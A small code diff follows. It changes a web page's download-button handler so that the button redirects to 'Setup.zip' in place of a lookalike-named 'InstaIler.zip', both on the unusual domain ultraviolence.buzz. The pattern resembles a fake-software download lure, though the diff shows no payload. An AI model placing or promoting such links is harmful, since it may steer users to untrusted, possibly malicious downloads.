@@ -3,7 +3,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   if (downloadBtn) {
     downloadBtn.addEventListener("click", () => {
-      window.location.href = "https://ultraviolence.buzz/f/InstaIler.zip";
+      window.location.href = "https://ultraviolence.buzz/f/Setup.zip";
     });
   }
 });
